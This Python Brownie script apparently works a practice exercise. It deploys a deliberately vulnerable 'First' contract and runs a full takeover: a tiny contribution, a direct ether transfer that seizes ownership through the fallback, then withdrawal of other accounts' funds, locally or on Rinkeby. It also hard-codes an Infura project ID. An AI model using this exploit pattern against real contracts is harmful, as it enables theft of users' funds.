from brownie import First, network, config
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3
from web3.middleware import geth_poa_middleware
import os


def deploy(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = First.deploy({"from": account}, publish_source=publish)
    print(f"Cotntract --FIRST-- deployed at {contract.address} from {account.address}")
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    if network.show_active() in LOCAL_NETWORKS:
        regular_acount_one = get_account(2)
        regular_acount_two = get_account(3)
        regular_acount_tree = get_account(4)
    print(f"Owner balace {owner_account.balance()}")
    print(f"Attacker balace {attacker_account.balance()}")
    print(f"OWNER: {owner_account.address}")
    print(f"ATTACkER: {attacker_account.address}")
    deployed_contract = deploy(owner_account)
    contributed_owner = deployed_contract.getContribution({"from": owner_account})
    print(f"Contributed by owner: {contributed_owner}")
    contributed_attacker = deployed_contract.getContribution({"from": attacker_account})
    print(f"Contributed by attacker: {contributed_attacker}")
    print(f"Contributing from attacker")
    if network.show_active() in LOCAL_NETWORKS:
        tx = deployed_contract.contribute(
            {"value": web3.Web3.toWei(0.0001, "ether"), "from": regular_acount_one}
        )
        tx.wait(1)
        tx = deployed_contract.contribute(
            {"value": web3.Web3.toWei(0.0003, "ether"), "from": regular_acount_two}
        )
        tx.wait(1)
        tx = deployed_contract.contribute(
            {"value": web3.Web3.toWei(0.0004, "ether"), "from": regular_acount_tree}
        )
        tx.wait(1)
    tx = deployed_contract.contribute({"value": 1, "from": attacker_account})
    tx.wait(1)
    contributed_attacker = deployed_contract.getContribution({"from": attacker_account})
    print(f"Owner balace {owner_account.balance()}")
    print(f"Attacker balace {attacker_account.balance()}")
    print(f"contract balance: {deployed_contract.balance()}")
    print(f"Now owner is: {deployed_contract.owner()}")
    print(f"Contributed by owner: {contributed_owner}")
    print("<<<<<<<<Attack precondition>>>>>>")
    print(f"Contributed by attacker: {contributed_attacker}")
    print(f"Contributed by owner: {contributed_owner}")
    if network.show_active() in LOCAL_NETWORKS:
        contributed_by_accouny_one = deployed_contract.getContribution(
            {"from": regular_acount_one}
        )
        print(f"Contributed by account one: {contributed_by_accouny_one}")
        contributed_by_accouny_two = deployed_contract.getContribution(
            {"from": regular_acount_two}
        )
        print(f"Contributed by account two: {contributed_by_accouny_two}")
        contributed_by_accouny_tree = deployed_contract.getContribution(
            {"from": regular_acount_tree}
        )
        print(f"Contributed by account tree: {contributed_by_accouny_tree}")
        print(f"<<<<<<<ATTACKING>>>>>>")
    if network.show_active() in LOCAL_NETWORKS:
        w3 = web3.Web3(web3.HTTPProvider("http://127.0.0.1:8545"))
        txn = {
            "from": str(attacker_account.address),
            "to": str(deployed_contract.address),
            "value": web3.Web3.toWei(0.00000000000001, "ether"),
        }
        txn_hash = w3.eth.send_transaction(txn)

    elif network.show_active() == "rinkeby":
        w3 = web3.Web3(
            web3.HTTPProvider(
                "https://rinkeby.infura.io/v3/bfcd4b27a9ae4840be1375009f61b8c9"
            )
        )
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        signed_txn = w3.eth.account.sign_transaction(
            dict(
                nonce=w3.eth.get_transaction_count(str(attacker_account.address)),
                maxFeePerGas=3000000000000,
                maxPriorityFeePerGas=2000000000000,
                gas=100000,
                to=str(deployed_contract.address),
                value=1,
                data=b"",
                # type=2,  # (optional) the type is now implicitly set based on appropriate transaction params
                chainId=4,
            ),
            os.environ["ATTACKER_PRIVATE_KEY"],
        )
        txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    else:
        print(network.show_active())
        raise f"No HTTP provider for network {network.show_active()}"
    w3.eth.wait_for_transaction_receipt(txn_hash)
    print(
        f"Contract balance: {web3.Web3.fromWei(deployed_contract.balance(), 'ether')}"
    )
    print(f"Now owner is: {deployed_contract.owner()}")
    deployed_contract.withdraw({"from": attacker_account})
    print(f"Attacker balace {web3.Web3.fromWei(attacker_account.balance(), 'ether')}")
    print(f"contract balance: {deployed_contract.balance()}")


if __name__ == "__main__":
    main()
